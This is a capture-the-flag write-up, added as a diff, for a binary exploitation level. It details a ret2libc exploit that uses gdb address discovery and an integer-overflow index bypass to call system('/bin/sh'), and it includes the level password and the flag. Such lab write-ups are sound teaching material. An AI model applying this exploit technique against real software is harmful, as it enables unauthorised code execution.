@@ -1,0 +1,71 @@
+level07 : GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+process :
+        - We got a binaire who has a main, store_number, read_number functions
+        - With store number we can store value into a buffer of v6[400],
+            but the index doesnt have a parsing limitation only a parsing who
+            reject multiple of 3 and 183.
+        - the goal here is to do a ret2libc (But we can also store a shellcode and call it after)
+        - First we need to find the adress of v6
+            gdb ./level07
+            disas main : 0x08048791 <+110>:	lea    0x24(%esp),%ebx (v6[400])
+            b *0x08048791
+            run
+            x/x $esp+0x24 or x/x $esp+36 : 0xffffd544:	0x00000000
+            Adress of v6[400] is 0xffffd544
+        - Then we need to find return adress (eip) who is store at ebp+4
+            x/x $ebp+4 : 0xffffd70c:	0xf7e45513
+            Adress of eip is : 0xffffd70c
+        - We can find the offset with : eip adress - v6 adress
+           python3
+            >>> eip = 0xffffd70c
+            >>> v6 = 0xffffd544
+            >>> offset = eip - v6
+            >>> offset
+            456
+            The offset between eip adress and v6 adress is v6 adress + 456
+            but in the store function we store 4 bytes by 4 bytes
+            so we need to write at 456/4 = 114 index in v6[400]
+        - After we need to find the adress of system and /bin/shell
+            gdb ./level07
+            b main
+            run
+            p system : $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+            find &system, +9999999, "/bin/sh" : 0xf7f897ec
+            The adress of system is    : 0xf7e6aed0
+            The adress of "/bin/sh" is : 0xf7f897ec
+        - We will re write the eip at v6[114], fake return at v6[115], and 1st arg at v6[116]
+            But we got a problem because 114 % 3 = 0
+            So to pass the parsing we will do an integer overflow 
+                (if we go to the limit of an integer he will wrap around an come back to 0)
+            store_number use an unsigned int so the max is 4294967295
+            with 2^32 = 4294967296 and we store 4 by 4 to pass the parsing we will do
+            (2^32 / 4) + 114 = 1073741938
+            We will write at v6[1073741938]
+        - Now we just need to convert adress in decimal to pass it throug the get_unum() function
+            python3
+            >>> system = 0xf7e6aed0
+            >>> binsh = 0xf7f897ec
+            >>> fakereturn = 0x41414141
+            >>> system
+            4159090384
+            >>> binsh
+            4160264172
+            >>> fakereturn
+            1094795585
+        - Finaly we can store in the binaire :
+            Input command: store
+            Number: 4159090384                  (system())
+            Index: 1073741938
+            Completed store command successfully
+            Input command: store
+            Number: 1094795585                  (fakereturn)
+            Index: 115
+            Completed store command successfully
+            Input command: store
+            Number: 4160264172                  ("/bin/sh")
+            Index: 116
+            Completed store command successfully
+            Input command: quit
+            $ whoami
+            level08
+        - Get the flag : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
